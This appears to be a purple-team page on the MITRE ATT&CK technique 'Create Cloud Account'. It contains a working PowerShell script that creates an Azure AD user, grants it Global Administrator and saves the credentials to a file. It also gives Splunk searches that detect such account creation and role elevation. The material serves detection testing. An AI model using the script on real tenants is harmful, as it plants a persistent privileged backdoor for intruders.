# Create Cloud Account
## About
Adversaries may create a cloud account to maintain access to victim systems. <br>
<b>Tactic</b>    : Persistence <br>
<b>Technique</b> : Create Account<br>
More details here in <a href="https://attack.mitre.org/techniques/T1136/003/" target="_blank"> MITRE ATT&CK </a>. <br>

## Attack simulation
The Below script will create a cloud-only account in Azure AD.
``` powershell
$TenantDetails = $NULL
$CurrentlyLoggedInUser = $NULL
$OnMicrosoftDomain = $NULL
$connection = $NULL
$CurrentTimestamp = [DateTime]::Now.ToString("yyyyMMdd-HHmmss")
try { 
    $AzureADSession = Get-AzureADCurrentSessionInfo
    $CurrentlyLoggedInUser = $AzureADSession.Account | select -ExpandProperty Id
    Write-Host "Already connected to : $AzureADSession.TenantDomain as $CurrentlyLoggedInUser"

} 
catch [Microsoft.Open.Azure.AD.CommonLibrary.AadNeedAuthenticationException] { 
    Write-Host "You're not connected to AzureAD. Connecting now..."; 
    $connection = Connect-AzureAD
    $AzureADSession = Get-AzureADCurrentSessionInfo
    $CurrentlyLoggedInUser = $AzureADSession.Account | select -ExpandProperty Id
    Write-Host "Connected to : $AzureADSession.TenantDomain as $CurrentlyLoggedInUser"
}
$CurrentlyLoggedInUser
$CurrentUserId = Get-AzureADUser -Filter "UserPrincipalName eq '$CurrentlyLoggedInUser'" | select -ExpandProperty ObjectId

$EmergencyUserUPNPrefix = Read-Host("Enter the name of the user you want to create or hit enter for the script to create one.")
if($EmergencyUserUPNPrefix -eq "")
{
	$EmergencyUserUPNPrefix = "TempUser_" + $CurrentTimestamp
}
$UserDisplayName = $EmergencyUserUPNPrefix 
$TenantDomain = $Connection.TenantDomain
$OnMicrosoftDomain = $CurrentlyLoggedInUser.substring($CurrentlyLoggedInUser.IndexOf('@'))
$OnMicrosoftDomain
$UserPrincipalName = $EmergencyUserUPNPrefix+$OnMicrosoftDomain

$EmUser = $NULL

try{
    $EmUser = Get-AzureADUser -ObjectId $UserPrincipalName -ErrorAction silentlycontinue
    write-output("Emergency user " + $UserPrincipalName + ' already exists.')
}catch{
    write-output("Emergency user " + $UserPrincipalName + ' does not exist. Creating now..')
    Add-Type -AssemblyName System.Web
    $UserPassword = [System.Web.Security.Membership]::GeneratePassword(32,2)
    $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
    $PasswordProfile.Password = $UserPassword
    $UserPassword
    $NewUser = New-AzureADUser -DisplayName $UserDisplayName -PasswordProfile $PasswordProfile -AccountEnabled $true -UserPrincipalName $UserPrincipalName -MailNickName "EmUser"

    # Adding the new user to Global Admin role
    Write-output "Adding the new user to Global Admin r+ole"
    $GlobalAdminRole = Get-AzureADDirectoryRole | Where-Object { $_.displayName -eq  "Global Administrator"} 
    Add-AzureADDirectoryRoleMember -ObjectId $GlobalAdminRole.ObjectId -RefObjectId $NewUser.ObjectId 

    # Saving the details for the app
    $temp_location = (get-location).Drive.Root+"office365_temp\"
    $temp_file = $temp_location + $CurrentTimestamp+".txt"
    New-Item $temp_location -ItemType Directory -Force | Out-Null
    New-Item $temp_file -ItemType File -Force | Out-Null
    Add-Content $temp_file ("Tenant Domain: " + $AzureADSession.TenantDomain)
    Add-Content $temp_file ("Tenant Id: " + $AzureADSession.TenantId)
    Add-Content $temp_file ("Username: " + $UserPrincipalName)
    Add-Content $temp_file ("Password: " + $UserPassword)
    .\notepad.exe $temp_file
    write-output("User details written to the file\r\n")
}
```
When the script is run, It asks the name of the user to be created.<br>
If we just hit enter, It creates a user named "TempUser_" followed by the current date-time. <br>
<img src="../../../images/o365mitre/CreateAccount-T1136.png"></img>
<br>
Azure AD user is created as seen in the Azure portal. <br>
<img src="../../../images/o365mitre/CreateAccount-T1136_1.png"></img>
<br>

## Splunk Detections
### Create user event
```powershell
index=azure sourcetype="azure:aad:audit" activityDisplayName="Add user" result="success"
| spath targetResources{}
| rename targetResources{}.userPrincipalName as UserAdded initiatedBy.user.userPrincipalName as CreatedByUPN  additionalDetails{}.value as UserAgent
| table _time UserAdded CreatedByUPN  UserAgent
```
<br>
Newly created user is found in the search. <br>
<img src="../../../images/o365mitre/CreateAccount-T1136_2.png"></img>

Note : "Swagger-Codegen/1.4.0.0/csharp" is the user agent when Azure AD PowerShell is used to create the user.
<br>

### The User was created outside PIM (e.g. PowerShell)
```powershell
index=azure operationType="RoleElevatedOutsidePimAlert" result="success" 
| rename targetResources{}.displayName as key_5, targetResources{}.userPrincipalName as key_6
| eval a = mvzip(key_5,key_6)
| makemv a delim=","
| eval RoleNameUserAddedto  = mvindex(a,0)
| eval UserAdded = mvindex(a,3)
| rename initiatedBy.user.displayName as CreatedByName, initiatedBy.user.userPrincipalName as CreatedByUPN
| table _time UserAdded RoleNameUserAddedto CreatedByName CreatedByUPN 
```